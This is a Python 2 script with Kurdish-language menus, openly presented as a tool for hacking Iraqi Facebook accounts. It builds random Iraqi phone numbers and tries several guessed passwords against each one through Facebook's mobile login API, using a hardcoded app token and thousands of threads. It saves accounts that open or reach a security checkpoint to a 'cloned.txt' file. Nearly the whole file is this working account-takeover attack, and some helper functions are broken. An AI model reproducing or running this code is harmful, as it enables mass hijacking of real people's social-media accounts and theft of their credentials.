#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(5000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:                                                                                                                                                   
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 All.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
        print 'Thanks.'
        os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(00000.1)
def tik():
        titik = ['.   ','..  ','... ']
        for o in titik:
                print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """ 
 _____                      __  __             _   _    
|  __ \                    |  \/  |           | | | |   
| |  | | __ _ _ __   __ _  | \  / | __ _ _ __ | |_| | __
| |  | |/ _` | '_ \ / _` | | |\/| |/ _` | '_ \| __| |/ /
| |__| | (_| | | | | (_| | | |  | | (_| | | | | |_|   < 
|_____/ \__,_|_| |_|\__,_| |_|  |_|\__,_|_| |_|\__|_|\_\
  
\033[1;91m  ╔════════════════════════════════════════════╗
\033[1;91m  ‖                                            ‖
\033[1;92m  ‖facebook:    dana sherzad                   ‖
\033[1;92m  ‖telegram     dana_sherzad                   ‖
\033[1;92m  ‖instagram    dana_1sherzad                  ‖
\033[1;91m  ‖                                            ‖
\033[1;91m  ╚════════════════════════════════════════════╝
                                                                     
"""

####Logo####

logo1 = """
    _                          _                   __ _                                                                                                               
  __| | __ _ _ __   __ _      (_) __ _  __ _      / _| |__                                                                                                            
 / _` |/ _` | '_ \ / _` |_____| |/ _` |/ _` |    | |_| '_ \                                                                                                           
| (_| | (_| | | | | (_| |_____| | (_| | (_| |    |  _| |_) |                                                                                                          
 \__,_|\__,_|_| |_|\__,_|     |_|\__,_|\__, |____|_| |_.__/                                                                                                           
                                          |_|_____|           
                                            
"""
logo2 = """
 _                                                                                                                                                                    
(_)_ __ __ _  __ _                                                                                                                                                    
| | '__/ _` |/ _` |                                                                                                                                                   
| | | | (_| | (_| |                                                                                                                                                   
|_|_|  \__,_|\__, |                                                                                                                                                   
                |_| 

"""
CorrectPasscode = "0"
print(" 🔒🔒🔒 pewista kody chuna zhurawat habet 🔒🔒🔒")

loop = 'true'
while (loop == 'true'):
    passcode = raw_input("\033[1;97m[🔒] \x1b[1;97mkodaka bnusa\x1b[1;97m: ")
    if (passcode == CorrectPasscode):
            print """
            \033[1;92m🔓🔓🔓prosaka sarkawtwbw✅✅✅
                  """
            print("----------- baxerbey bo hackkrdny fby iraqy -----------")
            loop = 'false'
    else:
            print "\033[1;91m🔒🔒🔒kodaka hallaya tkaya namam bo bnera"
            os.system('xdg-open t.me/dana_sherzad')

##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;92m[1]\x1b[1;92m hackkrdny facebooky iraqy."
    time.sleep(0.05)
    print '\x1b[1;91m[0]\033[1;91m daxstn.'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;91myakekyan hallbzhera: \033[1;95m")
    if peak =="":
        print "\x1b[1;91mboshayyaka jwan prbkawa"
        pilih_login()
    elif peak =="1":
        Zeek()
    elif peak =="0":
        keluar()
    else:
        print"\033[1;91m[!] hallbzhardayaky nadrust"
        keluar()


def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[1] dastpekrdn'
    time.sleep(0.05)
    print '\x1b[1;92m[0] \033[1;92mgaranawa'
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;91myakekyan hallbzhera:\033[1;97m')
    if peak =='':
        print '[!] boshayyaka jwan prbkawa'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        print("\033[1;92mkody bardast: 750, 751, 752, 770, 771, 772, 780, 781 ,782, 783")+'\n'
        try:
            c = raw_input("\033[1;91mkodekyan hallbzhera : ")
            k="+964"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] failaka nadozrayawa")
            raw_input("\n[ bgarewa ]")
            ZeeK()
    elif peak =='0':
        login()
    else:
        print '[!] ba jwany pry kawa'
        action()
    print 50* '\033[1;95m◈'
    print(" \r\033[1;32;40m◈◈◈◈◈◈◈  prosay hackkrdn dasty pekrd  ◈◈◈◈◈◈◈\033[1;97m")
    print("\033[1;92m◈◈◈◈◈◈◈  bo ragrtny prosaka CTRl+Z dabgra ◈◈◈◈◈◈◈")
    xxx = str(len(id))
    print('[✅] koy gshty zhmarakan: '+xxx)
    print ("[✅] hackkrdn tkaya bwasta...")
    print 50* '\033[1;95m◈'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = "0750"+ user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/cloned.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2="1234554321"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                       if 'www.facebook.com' in q['error_msg']:
                           print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass2
                           cps = open('save/cloned.txt', 'a')
                           cps.write(k+c+user+pass2+'\n')
                           cps.close()
                           cpb.append(c+user+pass2)
                       else:
                              pass3= user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3+ '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user +  '  |  ' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass3+'\n')
                        okb.close()
                        oks.append(c+user+pass3)
                    else:
                       if 'www.facebook.com' in q['error_msg']:
                           print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass3
                           cps = open('save/cloned.txt', 'a')
                           cps.write(k+c+user+pass3+'\n')
                           cps.close()
                           cpb.append(c+user+pass3)
                       else:
                              pass4= "1234512345"
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user +  '  |  ' + pass4
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass4+'\n')
                        okb.close()
                        oks.append(c+user+pass4)
                    else:
                       if 'www.facebook.com' in q['error_msg']:
                           print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass4
                           cps = open('save/cloned.txt', 'a')
                           cps.write(k+c+user+pass4+'\n')
                           cps.close()
                           cpb.append(c+user+pass4)
                       else:
                              pass5= "0751"+ user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user +  '  |  ' + pass5
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass5+'\n')
                        okb.close()
                        oks.append(c+user+pass5)
                    else:
                       if 'www.facebook.com' in q['error_msg']:
                           print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass5
                           cps = open('save/cloned.txt', 'a')
                           cps.write(k+c+user+pass5+'\n')
                           cps.close()
                           cpb.append(c+user+pass5)
                       else:
                              pass6= "0752"+ user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[hackkra bikawa]  ' + k + c + user +  '  |  ' + pass6
                        okb = open('save/cloned.txt', 'a')
                        okb.write(k+c+user+pass6+'\n')
                        okb.close()
                        oks.append(c+user+pass6)
                    else:
                       if 'www.facebook.com' in q['error_msg']:
                           print '\033[1;93m[chwa security] ' + k + c + user + '  |  ' + pass6
                           cps = open('save/cloned.txt', 'a')
                           cps.write(k+c+user+pass6+'\n')
                           cps.close()
                           cpb.append(c+user+pass6)
        except:
            pass
        
    p = ThreadPool(3000)
    p.map(main, id)
    print 50* '\033[1;95m◈'
    print '[✅] prosaka tawaw bw ...'
    print '[✅] koy gshty sarkawtwan w securityakan : '+str(len(oks))+'/'+str(len(cpb))
    print('[✅] accountakan save kran la faily : save/cloned.txt')
    jalan("tebinyak accounta securityakan bardast abnawa dway 5 rozh ya haftayak tkaya mayan srawa")
    print '\033[1;95mxwat lagal'
    
    raw_input("\n\033[1;91m[\033[1;91mgaranawa\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

